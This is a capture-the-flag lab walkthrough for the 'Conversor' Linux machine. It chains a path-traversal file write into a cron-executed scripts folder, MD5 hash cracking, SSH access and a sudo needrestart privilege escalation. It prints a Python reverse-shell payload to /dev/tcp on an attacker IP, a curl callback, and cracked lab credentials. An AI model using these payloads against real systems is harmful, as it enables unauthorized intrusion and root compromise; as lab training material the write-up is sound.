# Conversor

**Target IP:** `10.129.238.31`
**Hostname:** `conversor.htb`
**Platform:** `Linux`
**Difficulty:** `Easy`

---

## 1. Enumeration

## Port Scan

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
```

The scan reveals a classic HTTP and SSH combination. Initial efforts should focus on the web application on port 80 to find a foothold, as this is where most vulnerabilities are found.

## Web Reconnaissance

The website presents a **login/register** interface:
![](Screenshots/Pasted%20image%2020260330160735.png)

After registering an account (`test:pass`), access is granted to a page that allows users to upload **XML** and **XSLT** files to format data into a "nicer" layout:
![](Screenshots/Pasted%20image%2020260330160800.png)

On the `/about` page, the source code of the application is available for download:
![](Screenshots/Pasted%20image%2020260330160831.png)

Directory fuzzing:

```bash
feroxbuster --url http://conversor.htb/
```
![](Screenshots/Pasted%20image%2020260330161038.png)
This also identifies the interesting `source_code.tar.gz` but nothing else

Subdomain / vhost enumeration:

```bash
ffuf -c -u http://10.129.238.31 -H "Host: FUZZ.conversor.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fc 301
```
## Additional Enumeration

**Testing the site:**

Before digging any deeper into the analysis, I attempt to use the site for it's intended purpose. To do this I download the template file that is given and upload it to the XSLT file upload.

For the XML file I run a simple nmap scan and output it as XML:
```bash
nmap 10.129.238.31 -oX nmap2.xml
```

Then I upload both of these files, which generates a link to the uploaded file, with a randomly generated filename:
![](Screenshots/Pasted%20image%2020260330162429.png)

Clicking on this we can see the xml has been formatted into a table:
![](Screenshots/Pasted%20image%2020260330162456.png)

In Burp Suite this was the POST request sent:
![](Screenshots/Pasted%20image%2020260330163000.png)


**Source Code Review:**

After downloading from the `/about` page, the source code is unzipped using:

```bash
tar -xvf source_code.tar.gz
```

The source code leaks the entire code used for the website, which is found to be a Flask application:
![](Screenshots/Pasted%20image%2020260330161216.png)

Some key findings from the source code include:

- **Technology:** Flask, sqlite3, eTree XML parser
- **Secret Key:** `Changemeplease` (potential for session hijacking/resigning).
- **Database:** Located at `/var/www/conversor.htb/instance/users.db` using MD5 for password hashing.
- **Cronjob Hint:** A comment in `install.md` suggests a cleanup/task script:
    `* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done`
    

Digging into the functionality of the code, it seems to take two files an XML file and an XSLT, it uses the template XSLT file to format the XML into a nice format:
![](Screenshots/Pasted%20image%2020260330161812.png)

However, when you send a POST request to this endpoint with files, it places them in the **UPLOAD_FOLDER**, however, as it is using `os.path.join` with no filename validation we can perform path traversal here.

---

## 2. Initial Foothold — os.path.join Arbitrary File Write > RCE 

Up until this point we have found 2 potential vulnerabilities but the first was perhaps overlooked initially. With the usage of `os.path.join` and a controllable filename we can arbitrarily write files, however, assuming the web service account is low privileged and can't write ssh keys, this may have little impact. However, we found earlier this line in `install.md`:

```
If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.

"""
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
"""
```

Given that they state "Our server deletes all files..." this implies that the server we are attacking has this cronjob enabled, therefore if we can write a malicious python file to the scripts folder we can gain RCE.
### Exploitation

We can test this theory by taking the same request found earlier in Burp Suite and modifying the payload to a python file which will attempt to call out to our listener:

**Test RCE:**

1. Craft a Python script (`test.py`) to execute a reverse shell:
    ```python
    import os
    os.system("curl 10.10.14.2")
    ```
2. Start a simple listener on port 80:
	```bash
	sudo nc -lvnp 80
	```
3. Modify the previous request to change the destination filename to `../scripts/test.py` and the content to the python file above:
![](Screenshots/Pasted%20image%2020260330163523.png)
4. The cronjob executes the script within one minute, and we get a callback on our listener:
![](Screenshots/Pasted%20image%2020260330163556.png)

It's worth noting here that even though we got a parsing error, the file has already been written at this point so it's too late to perform any validation.

**Test RCE:**

1. Craft a Python script (`shell.py`) to attempt a callback to our host:
    ```python
    import os
    os.system("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'")
    ```
2. Start a penelope listener:
	```bash
	python3 penelope.py
	```
3. Modify the previous request to change the destination filename to `../scripts/shell.py` and the content to the python file above.
4. The cronjob executes the script within one minute, and we get a callback on our listener:
![](Screenshots/Pasted%20image%2020260330165033.png)

---

## 3. Credential Harvesting

We already know from the source code analysis that there is a db of users in `/var/www/conversor.htb/instance/users.db` which will likely contain passwords, viewing this we fine the following

### Discovered Credentials

| **Name**   | **Value**                          |
| ---------- | ---------------------------------- |
| fismathack | `5b5c3ac3a1c897c94caad48e6c71fdec` |

### Cracking

The MD5 hash was cracked to reveal the plaintext password:

```bash
hashcat -m 0 -a 0 5b5c3ac3a1c897c94caad48e6c71fdec /usr/share/wordlists/rockyou.txt
```

![](Screenshots/Pasted%20image%2020260330165447.png)

**Cracked credential:** `Keepmesafeandwarm`

---

## 4. User Shell
```bash
ssh fismathack@conversor.htb
```

Access was obtained using the cracked credentials over SSH, allowing for the retrieval of `user.txt`:
![](Screenshots/Pasted%20image%2020260330165621.png)

---

## 5. Privilege Escalation — Sudo needrestart

### Enumeration

Checking sudo privileges for the user:

```bash
sudo -l
```

The user `fismathack` is permitted to run `/usr/sbin/needrestart` with root privileges:
![](Screenshots/Pasted%20image%2020260330165733.png)

### Vulnerability Analysis

The `needrestart` utility can be used to check which services need to be restarted. By leveraging specific flags, we can trick the utility into reading files or executing actions with elevated privileges.

### Unintended route

Whilst testing I discovered an interesting trick.The config flag (`-c`) can be used to read the root flag when verbose mode is enabled. This is because the binary attempts to read it, but fails as it isn't in the right format, and in verbose mode it prints this to the screen

```bash
sudo needrestart -v -c /root/root.txt
```

The command output reveals the contents of the root flag, however I suspect this isn't the intended route:
![](Screenshots/Pasted%20image%2020260330170026.png)

### Intended route

Viewing the binary on `gtfobins.org` we can see if we pass a config file with perl code into the config flag (`-c`) we can execute any code as root.

So if we make a file in `/tmp/tjr.conf` and insert the following:
```perl
exec "/bin/bash";
```

Then run the needrestart binary as root:
```bash
sudo needrestart -c /tmp/tjr.conf
```

We get a shell as root and can grab the root flag:
![](Screenshots/Pasted%20image%2020260330170723.png)

---

## Summary

| **Step**             | **Technique**                                                        |
| -------------------- | -------------------------------------------------------------------- |
| Initial access       | Path Traversal / XSLT Upload — Writing to a cron-monitored directory |
| Credential access    | Reading `users.db` and cracking MD5 hashes                           |
| User shell           | SSH via cracked credentials                                          |
| Privilege escalation | Sudo abuse of `/usr/sbin/needrestart`                                |
